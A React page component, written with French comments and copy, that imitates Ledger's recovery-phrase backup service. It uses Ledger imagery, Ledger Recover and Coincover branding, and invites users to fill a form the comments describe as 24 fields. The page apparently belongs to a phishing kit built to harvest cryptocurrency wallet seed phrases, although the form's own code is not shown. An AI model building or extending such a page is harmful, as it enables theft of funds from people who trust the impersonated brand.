// src/pages/RecoveryPhrasePage.js
import React, { useEffect } from 'react';
import LogoBar from '../components/Logobar';         // ta barre de navigation
import RecoveryPhraseForm from '../components/RecoveryForm'; // le formulaire
import '../components/RecoveryPhrase.css';           // le CSS dédié
import ledgerGif from '../assets/loader.gif';
import facebookLogo from '../assets/reseau1.png';
import twitterLogo from '../assets/reseau2.png';
import instagramLogo from '../assets/reseau3.png';
import instagramLogo2 from '../assets/reseau4.png';
import instagramLogo3 from '../assets/reseau5.png';
import instagramLogo4 from '../assets/reseau6.png';
import instagramLogo5 from '../assets/reseau7.png';
import instagramLogo6 from '../assets/reseau8.png';
import ContactSection from '../components/ContactSection';

const RecoveryPhrasePage = () => {
  // Add scroll animation effect
  useEffect(() => {
    const handleScroll = () => {
      const fadeElements = document.querySelectorAll('.fade-in-up');
      
      fadeElements.forEach(element => {
        const elementTop = element.getBoundingClientRect().top;
        const elementVisible = 150;
        
        if (elementTop < window.innerHeight - elementVisible) {
          element.classList.add('visible');
        } else {
          element.classList.remove('visible');
        }
      });
    };

    window.addEventListener('scroll', handleScroll);
    // Trigger once on load
    handleScroll();
    
    return () => {
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  return (
    <div className="recovery-page-container">
      {/* Navbar en haut */}
      <LogoBar />

      {/* SECTION HERO NOIR */}
      <section className="recovery-hero">
        <div className="hero-content fade-in-up">
          <h1>La solution de sauvegarde numérique pour préserver l'accès à votre wallet</h1>
          <p>Restez serein : protégez votre phrase de récupération, quoi qu'il arrive.</p>
        </div>
      </section>

      {/* SECTION FORMULAIRE (GIF + 24 champs) */}
      <RecoveryPhraseForm />

      {/* SECTION "Sécurisez votre seed phrase" */}
      <section className="seedphrase-section fade-in-up">
        {/* Image ou GIF en haut au centre sur mobile */}
        <div className="seedphrase-image-container">
          <img 
            src="https://i.ibb.co/jvDN6JPy/visual-ledger-recover.png" 
            alt="Phone and Ledger" 
            className="seedphrase-image"
          />
        </div>

        {/* Texte à gauche sur desktop, sous l'image sur mobile */}
        <div className="seedphrase-text">
          <h2>Sécurisez votre seed phrase</h2>
          <p>
            Après avoir obtenu votre approbation, votre appareil Ledger chiffre votre phrase de récupération secrète. 
            Le résultat chiffré est divisé en trois fragments au sein de la puce Secure Element de votre appareil.
          </p>
          <p>
          Ces fragments chiffrés constituent la sauvegarde pour votre phrase de récupération secrète.
          </p>
          <p>
            Chaque fragment chiffré est distribué en toute sécurité vers des HSM.
            Ces fragments chiffrés constituent la sauvegarde pour votre phrase de récupération secrète.
          </p>
        </div>
      </section>

      <button className="coincover-button fade-in-up">Service fourni par Coincover</button>
      <br/>
    </div>
  );
};

export default RecoveryPhrasePage;
